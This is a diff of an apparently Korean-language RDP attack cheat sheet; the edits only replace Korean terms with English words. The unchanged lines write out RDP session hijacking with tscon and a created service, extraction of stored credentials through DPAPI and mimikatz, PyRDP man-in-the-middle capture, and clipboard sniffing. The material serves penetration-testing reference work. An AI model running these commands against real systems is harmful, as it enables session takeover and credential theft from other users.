@@ -63,11 +63,11 @@ nxc smb TARGET -u admin -H HASH -x "reg add HKLM\System\CurrentControlSet\Contro
 ### RDP Session Hijacking
 
 ```powershell
-# 관리자 권한으로 다른 사용자의 RDP 세션 탈취
-# 세션 목록 확인
+# 관리자 권한으로 다른 사용자의 RDP session 탈취
+# session 목록 확인
 query user
 
-# SYSTEM 권한으로 세션 연결 (비밀번호 불필요)
+# SYSTEM 권한으로 session 연결 (비밀번호 불필요)
 tscon SESSION_ID /dest:rdp-tcp#0
 # 또는 서비스로 실행
 sc create rdphijack binpath="cmd.exe /k tscon SESSION_ID /dest:rdp-tcp#0" start=demand
@@ -104,7 +104,7 @@ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 
 ---
 
-## 저장된 RDP 자격 증명 탈취
+## 저장된 RDP credential 탈취
 
 ### .rdp 파일 / Credential Manager
 
@@ -116,7 +116,7 @@ reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
 # 저장된 .rdp 파일
 Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.rdp -Force
 
-# Credential Manager 에 저장된 "TERMSRV/..." 자격증명 (DPAPI 암호화)
+# Credential Manager 에 저장된 "TERMSRV/..." credential (DPAPI 암호화)
 cmdkey /list | Select-String TERMSRV
 ```
 
@@ -132,14 +132,14 @@ dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID>
 dpapi::cred /in:... /masterkey:<MASTERKEY>
 
 # 실행 중인 mstsc 에서 평문 추출
-ts::mstsc                 # 현재 세션의 mstsc 프로세스에서 패스워드 긁기
+ts::mstsc                 # 현재 session의 mstsc 프로세스에서 패스워드 긁기
 ```
 
 ---
 
 ## PyRDP MITM
 
-조건: 공격자가 타겟과 RDP 서버 사이 경로(ARP spoofing, DNS hijack, 사내 man-in-the-middle 등)를 가질 때.
+조건: 공격자가 target과 RDP 서버 사이 경로(ARP spoofing, DNS hijack, 사내 man-in-the-middle 등)를 가질 때.
 
 ```bash
 # PyRDP - 투명 MITM 프록시 (키 입력 / 클립보드 / 파일 / 크리덴셜 캡처)
@@ -147,11 +147,11 @@ pyrdp-mitm.py RDP_SERVER_IP
 pyrdp-mitm.py RDP_SERVER_IP -o /tmp/pyrdp --no-replay
 
 # 저장 위치
-# /tmp/pyrdp/replays/     - 세션 리플레이 (Shadow 재생)
+# /tmp/pyrdp/replays/     - session 리플레이 (Shadow 재생)
 # /tmp/pyrdp/files/       - 클립보드/드라이브 전송 파일
-# pyrdp-mitm.log          - 입력된 자격증명 평문
+# pyrdp-mitm.log          - 입력된 credential 평문
 
-# 세션 재생
+# session 재생
 pyrdp-player.py replay.pyrdp
 ```
 
@@ -160,7 +160,7 @@ pyrdp-player.py replay.pyrdp
 ## 클립보드 하이재킹
 
 ```text
-# RDP 클립보드는 기본 양방향. 공격자 호스트에서 타겟의 클립보드 내용 스니핑 가능
+# RDP 클립보드는 기본 양방향. 공격자 호스트에서 target의 클립보드 내용 스니핑 가능
 # xfreerdp 에서 클립보드 공유 활성: +clipboard
 # PyRDP / ScreenConnect 기반 도구로 클립보드 로깅 가능
 ```
